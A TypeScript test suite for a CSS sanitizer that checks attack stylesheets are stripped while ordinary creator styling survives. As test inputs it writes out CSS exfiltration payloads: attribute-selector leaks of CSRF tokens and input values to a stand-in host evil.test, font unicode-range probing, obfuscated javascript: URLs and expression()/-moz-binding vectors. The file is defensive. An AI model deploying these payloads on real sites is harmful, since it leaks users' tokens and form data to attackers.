import { test } from 'node:test';
import assert from 'node:assert/strict';
import { sanitizeCss } from '../src/sanitize.ts';

const clean = (css: string, opts = {}) => sanitizeCss(css, opts).css;

// ---------------------------------------------------------------------------
// 1. Attribute-selector token exfiltration
// ---------------------------------------------------------------------------

test('classic value-attribute exfiltration is removed', () => {
  const out = clean('input[value^="a"] { background: url(https://evil.test/c?a) }');
  assert.equal(out.trim(), '');
});

test('escape-obfuscated attribute name is still caught', () => {
  const out = clean('input[v\\61 lue^="a"] { background: url(https://evil.test/?a) }');
  assert.equal(out.trim(), '');
});

test('escape-obfuscated url keyword is still judged as a URL', () => {
  const out = clean(
    'a[href^="#"] { background: u\\72 l(https://evil.test/x) }',
  );
  // combo protection: prefix matcher + absolute URL -> declaration dropped
  assert.equal(out.trim(), '');
});

test('all matcher types on sensitive attributes are removed', () => {
  for (const m of ['=', '~=', '|=', '^=', '$=', '*=']) {
    const out = clean(`input[value${m}"x"] { color: red }`);
    assert.equal(out.trim(), '', `matcher ${m} should be removed`);
  }
});

test('presence-only attribute selector on sensitive attribute is kept', () => {
  const out = clean('input[value] { color: red }');
  assert.ok(out.includes('input[value]'), out);
  assert.ok(out.includes('color: red'), out);
});

test('sensitive attribute hidden inside :not()/:is() is caught', () => {
  assert.equal(clean('form:not([value^="a"]) { color: red }').trim(), '');
  assert.equal(clean(':is(input, [value$="b"]) { color: red }').trim(), '');
});

test('combo protection: prefix matcher + absolute URL dropped, relative kept', () => {
  const abs = clean('a[href^="https"] { background: url(https://evil.test/x.png) }');
  assert.equal(abs.trim(), '');
  const rel = clean('a[href^="#"] { background: url(/icons/hash.png) }');
  assert.ok(rel.includes('/icons/hash.png'), rel);
  const data = clean('a[href^="#"] { background: url(data:image/png;base64,AAAA) }');
  assert.ok(data.includes('data:image/png'), data);
});

test('combo protection: var() in URL-loading property of probing rule dropped', () => {
  const out = clean(
    ':root { --bg: url(https://evil.test/x) } a[href^="/"] { background: var(--bg) }',
  );
  assert.ok(!out.includes('var(--bg)'), out);
  // The custom property itself is fine (https URL passes the URL policy).
  assert.ok(out.includes('--bg'), out);
});

test('exfiltration via custom property with bad scheme is blocked', () => {
  const out = clean(':root { --x: url(javascript:alert(1)) } body { background: var(--x) }');
  assert.ok(!out.includes('--x:'), out);
  assert.ok(out.includes('background: var(--x)'), out); // harmless without --x
});

test('host allowlist stops exfiltration to attacker hosts', () => {
  const out = clean('p { background: url(https://evil.test/track.png) }', {
    urlPolicy: { allowedHosts: ['cdn.example.com'] },
  });
  assert.equal(out.trim(), '');
  const ok = clean('p { background: url(https://cdn.example.com/a.png) }', {
    urlPolicy: { allowedHosts: ['cdn.example.com'] },
  });
  assert.ok(ok.includes('cdn.example.com'), ok);
});

// ---------------------------------------------------------------------------
// 2. unicode-range font probing
// ---------------------------------------------------------------------------

test('unicode-range stripped from @font-face, rest preserved', () => {
  const out = clean(
    '@font-face { font-family: "Theme"; src: url(https://cdn.example.com/f.woff2) format("woff2"); unicode-range: U+41; font-display: swap }',
  );
  assert.ok(!out.includes('unicode-range'), out);
  assert.ok(out.includes('font-family: "Theme"'), out);
  assert.ok(out.includes('src: url("https://cdn.example.com/f.woff2") format("woff2")'), out);
  assert.ok(out.includes('font-display: swap'), out);
});

test('escape-split unicode-range descriptor is still stripped', () => {
  const out = clean(
    '@font-face { font-family: x; src: url(/f.woff2); un\\69 code-range: U+0041 }',
  );
  assert.ok(!/unicode-range/i.test(out), out);
  assert.ok(out.includes('font-family: x'), out);
});

test('per-character probing @font-face set becomes harmless', () => {
  let css = '';
  for (const ch of ['U+41', 'U+42', 'U+43']) {
    css += `@font-face { font-family: probe; src: url(https://evil.test/${ch}); unicode-range: ${ch} }`;
  }
  const out = clean(css);
  assert.ok(!out.includes('unicode-range'), out);
  // src URLs to evil.test still pass a default https policy; the *probing*
  // mechanism (conditional per-glyph loading) is gone. Use allowedHosts to
  // also remove the tracking requests.
});

// ---------------------------------------------------------------------------
// 3. URL / import / script channels
// ---------------------------------------------------------------------------

test('@import dropped by default, allowed with host allowlist', () => {
  assert.equal(clean('@import url(https://evil.test/x.css);').trim(), '');
  assert.equal(clean('@import "https://evil.test/x.css";').trim(), '');
  const out = clean('@import url(https://cdn.example.com/theme.css);', {
    allowImport: { allowedHosts: ['cdn.example.com'] },
  });
  assert.ok(out.includes('@import'), out);
  const bad = clean('@import url(https://evil.test/x.css);', {
    allowImport: { allowedHosts: ['cdn.example.com'] },
  });
  assert.equal(bad.trim(), '');
});

test('javascript:/vbscript: URLs blocked even when obfuscated', () => {
  assert.equal(clean('a { background: url(javascript:alert(1)) }').trim(), '');
  // tab inside scheme: the URL parser strips tabs, so must we
  assert.equal(clean('a { background: url("java\tscript:alert(1)") }').trim(), '');
  assert.equal(clean('a { background: url("  javascript:alert(1)") }').trim(), '');
});

test('data: URLs restricted to image/font mimes', () => {
  const ok = clean('a { background: url(data:image/png;base64,AAAA) }');
  assert.ok(ok.includes('data:image/png'), ok);
  assert.equal(clean('a { background: url(data:text/html,<script>) }').trim(), '');
  const font = clean('@font-face { font-family: x; src: url(data:font/woff2;base64,AAAA) }');
  assert.ok(font.includes('data:font/woff2'), font);
});

test('image-set string URLs are checked', () => {
  const out = clean('a { background: image-set("https://evil.test/x.png" 1x, "/ok.png" 2x) }', {
    urlPolicy: { allowedHosts: ['cdn.example.com'] },
  });
  assert.equal(out.trim(), '');
});

test('behavior/-moz-binding/expression removed', () => {
  assert.equal(clean('a { behavior: url(x.htc) }').trim(), '');
  assert.equal(clean('a { -moz-binding: url(https://evil.test/x#xss) }').trim(), '');
  assert.equal(clean('a { width: expression(alert(1)) }').trim(), '');
});

test(':visited selectors dropped', () => {
  assert.equal(clean('a:visited { background: url(https://evil.test/h) }').trim(), '');
  assert.ok(clean('a:hover { color: red }').includes('a:hover'));
});

test('@charset dropped', () => {
  const out = clean('@charset "utf-8"; a { color: red }');
  assert.ok(!out.includes('@charset'), out);
  assert.ok(out.includes('color: red'), out);
});

// ---------------------------------------------------------------------------
// 4. Creator content must be preserved
// ---------------------------------------------------------------------------

test('animations and @keyframes preserved', () => {
  const css = `
@keyframes spin {
  from { transform: rotate(0deg); }
  to { transform: rotate(360deg); }
}
.spinner { animation: spin 2s linear infinite; transition: opacity .3s ease-in-out; }`;
  const out = clean(css);
  assert.ok(out.includes('@keyframes spin'), out);
  assert.ok(out.includes('transform: rotate(360deg)'), out);
  assert.ok(out.includes('animation: spin 2s linear infinite'), out);
  assert.ok(out.includes('transition: opacity .3s ease-in-out'), out);
});

test('gradients preserved', () => {
  const css = `a { background: linear-gradient(135deg, #ff0000 0%, rgba(0,0,255,.5) 100%); }
b { background: radial-gradient(circle at 50% 50%, red, blue), conic-gradient(from 0deg, red, blue); }`;
  const out = clean(css);
  assert.ok(out.includes('linear-gradient(135deg, #ff0000 0%, rgba(0,0,255,.5) 100%)'), out);
  assert.ok(out.includes('conic-gradient(from 0deg, red, blue)'), out);
});

test('grid layout preserved', () => {
  const css = `.grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); grid-template-areas: "a a" "b c"; gap: 1rem; }
.item { grid-area: a; }`;
  const out = clean(css);
  assert.ok(out.includes('grid-template-columns: repeat(auto-fit, minmax(200px, 1fr))'), out);
  assert.ok(out.includes('grid-template-areas: "a a" "b c"'), out);
  assert.ok(out.includes('grid-area: a'), out);
});

test('custom fonts and typography preserved (minus unicode-range)', () => {
  const css = `@font-face { font-family: "My Theme"; src: local("My Theme"), url(https://cdn.example.com/theme.woff2) format("woff2"); font-weight: 100 900; font-display: swap; }
body { font-family: "My Theme", system-ui, sans-serif; font-variation-settings: "wght" 650; }`;
  const out = clean(css);
  assert.ok(out.includes('font-family: "My Theme"'), out);
  assert.ok(out.includes('local("My Theme")'), out);
  assert.ok(out.includes('font-weight: 100 900'), out);
  assert.ok(out.includes('font-variation-settings: "wght" 650'), out);
});

test('media queries, supports, custom properties, nesting preserved', () => {
  const css = `:root { --brand: #0366d6; --pad: 1rem; }
.card { padding: var(--pad); color: var(--brand); &:hover { color: black } }
@media (max-width: 600px) { .card { padding: 0 } }
@supports (display: grid) { .card { display: grid } }`;
  const out = clean(css);
  assert.ok(out.includes('--brand: #0366d6'), out);
  assert.ok(out.includes('padding: var(--pad)'), out);
  assert.ok(out.includes('&:hover'), out);
  assert.ok(out.includes('@media (max-width: 600px)'), out);
  assert.ok(out.includes('@supports (display: grid)'), out);
});

test('calc/clamp/min/max and modern functions preserved', () => {
  const out = clean('a { width: calc(100% - 2rem); font-size: clamp(1rem, 2.5vw, 2rem); margin: max(1em, 2vh) }');
  assert.ok(out.includes('calc(100% - 2rem)'), out);
  assert.ok(out.includes('clamp(1rem, 2.5vw, 2rem)'), out);
});

test('warnings explain every drop', () => {
  const { warnings } = sanitizeCss(
    'input[value^="a"] { background: url(https://evil.test/x) } @font-face { font-family: x; src: url(/x); unicode-range: U+41 }',
  );
  assert.ok(warnings.some((w) => w.includes('value')), warnings.join('\n'));
  assert.ok(warnings.some((w) => w.includes('unicode-range')), warnings.join('\n'));
});

test('full attack stylesheet from the report is neutralized', () => {
  // Simulated white-hat PoC: char-by-char token leak + font probing.
  let css = '';
  for (const ch of 'abcdef') {
    css += `input[name=csrf][value^="${ch}"] { background: url(https://evil.test/leak?c=${ch}) }\n`;
  }
  css += '@font-face { font-family: p1; src: url(https://evil.test/font?g=A); unicode-range: U+41 }\n';
  css += '@font-face { font-family: p2; src: url(https://evil.test/font?g=B); unicode-range: U+42 }\n';

  // Layer 1 (default policy): selector exfiltration and glyph probing dead.
  const def = sanitizeCss(css);
  assert.ok(!def.css.includes('leak?'), def.css);
  assert.ok(!def.css.includes('unicode-range'), def.css);

  // Layer 2 (host allowlist): no attacker-controlled URL survives at all.
  const strict = sanitizeCss(css, {
    urlPolicy: { allowedHosts: ['cdn.example.com'] },
  });
  assert.ok(!strict.css.includes('evil.test'), strict.css);
});
